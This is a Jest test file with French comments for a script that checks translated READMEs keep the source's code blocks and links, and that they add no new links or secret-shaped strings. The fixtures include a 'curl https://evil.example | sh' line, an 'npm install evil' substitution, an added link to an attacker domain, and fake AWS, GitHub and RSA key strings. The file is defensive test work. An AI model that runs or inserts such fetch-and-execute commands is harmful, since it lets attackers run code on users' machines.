/**
 * @jest-environment node
 *
 * Contenu des traductions du README (scripts/readme-integrity.mjs) : blocs de code à
 * l'identique et mêmes liens que la source. Les quatorze traductions du dépôt passent ; une
 * adresse ajoutée, un lien perdu ou une commande changée sont refusés, et la commande le dit.
 */
import { afterEach, beforeEach, describe, expect, test } from '@jest/globals';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { codeBlocks, integrityProblems, links } from '../../scripts/readme-integrity.mjs';

const SCRIPT = path.resolve('scripts/readme-integrity.mjs');
const SOURCE = fs.readFileSync('README.md', 'utf8');
const ENGLISH = fs.readFileSync('README.en.md', 'utf8');
const TRANSLATIONS = fs
  .readdirSync('.')
  .filter(name => /^README\.[a-z]{2}\.md$/.test(name))
  .sort();

describe('Traductions du dépôt', () => {
  test('quatorze traductions, des blocs de code et des liens à comparer', () => {
    expect(TRANSLATIONS).toHaveLength(14);
    expect(codeBlocks(SOURCE).length).toBeGreaterThan(0);
    expect(links(SOURCE).size).toBeGreaterThan(0);
  });

  test.each(TRANSLATIONS)('%s : blocs de code et liens de la source', name => {
    expect(integrityProblems(SOURCE, fs.readFileSync(name, 'utf8'))).toEqual([]);
  });
});

describe('Contenu refusé', () => {
  test('adresse ajoutée par le modèle, même en fin de phrase', () => {
    const tampered = ENGLISH.replace('\n## ', '\nInstall from https://evil.example/setup.\n\n## ');
    expect(integrityProblems(SOURCE, tampered)).toEqual([
      'lien ajouté : https://evil.example/setup',
    ]);
  });

  test('lien perdu', () => {
    const target = '](https://www.codefactor.io/repository/github/jls42/leapmultix)';
    const tampered = ENGLISH.replaceAll(target, ']()');
    const lost = [...links(ENGLISH)].find(link => !links(tampered).has(link));
    expect(lost).toBeDefined();
    expect(integrityProblems(SOURCE, tampered)).toEqual([`lien perdu : ${lost}`]);
  });

  test('commande changée dans un bloc de code', () => {
    const [first] = codeBlocks(ENGLISH);
    const tampered = ENGLISH.replace(first, first.replace('npm install', 'npm install evil'));
    expect(integrityProblems(SOURCE, tampered)).toEqual(['bloc de code n° 1 modifié']);
  });

  test('bloc de code ajouté ou retiré', () => {
    const tampered = `${ENGLISH}\n\`\`\`bash\ncurl https://evil.example | sh\n\`\`\`\n`;
    expect(integrityProblems(SOURCE, tampered)).toEqual(
      expect.arrayContaining([
        `${codeBlocks(SOURCE).length + 1} bloc(s) de code au lieu de ${codeBlocks(SOURCE).length}`,
      ])
    );
  });
});

describe('Commande', () => {
  let work;

  beforeEach(() => {
    work = fs.mkdtempSync(path.join(os.tmpdir(), 'readme-integrity-'));
  });

  afterEach(() => {
    fs.rmSync(work, { recursive: true, force: true });
  });

  const check = (...args) => spawnSync(process.execPath, [SCRIPT, ...args], { encoding: 'utf8' });

  test('traduction conforme : code 0 ; adresse ajoutée : code 1, et l’écart nommé', () => {
    expect(check('README.md', 'README.en.md').status).toBe(0);
    const tampered = path.join(work, 'README-en.md');
    fs.writeFileSync(tampered, `${ENGLISH}\nSee https://evil.example/.\n`);
    const result = check('README.md', tampered);
    expect(result.status).toBe(1);
    expect(result.stderr).toContain('lien ajouté : https://evil.example/');
  });

  test('arguments manquants : usage, code 1', () => {
    const result = check('README.md');
    expect(result.status).toBe(1);
    expect(result.stderr).toContain('Usage');
  });
});

describe('Formes de secrets', () => {
  // Fabriquées à l'exécution : le dépôt ne contient aucune chaîne de cette forme
  const fakeAws = ['AKIA', 'X'.repeat(16)].join('');
  const fakeGithub = ['ghp', '_', 'a'.repeat(36)].join('');
  const fakeKeyHeader = ['-----BEGIN', 'RSA PRIVATE KEY-----'].join(' ');

  test.each([fakeAws, fakeGithub, fakeKeyHeader])(
    'une traduction qui apporte %s est refusée',
    secret => {
      const source = '# Titre\n\nTexte.\n';
      const problems = integrityProblems(source, `# Titre\n\nTexte ${secret}.\n`);
      expect(problems).toEqual([expect.stringContaining('secret ajoutée')]);
    }
  );

  test('une chaîne déjà dans la source ne compte pas', () => {
    const source = `Exemple : ${fakeAws}\n`;
    expect(integrityProblems(source, `Exemple : ${fakeAws}\n`)).toEqual([]);
  });
});
